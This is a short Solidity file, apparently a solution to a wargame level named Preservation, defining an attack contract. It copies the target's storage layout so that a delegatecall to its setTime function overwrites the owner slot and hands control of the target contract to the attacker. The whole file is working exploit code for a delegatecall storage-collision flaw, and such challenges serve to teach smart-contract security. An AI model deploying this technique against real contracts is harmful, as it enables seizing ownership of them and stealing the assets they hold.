// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import 'interfaces/libraryContractInterface.sol';

contract PreservationAttack is LibraryContractInterface {
    // same layout as Preservation contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    
    function setTime(uint256 _data) public override {
        owner = address(_data);
    }
}
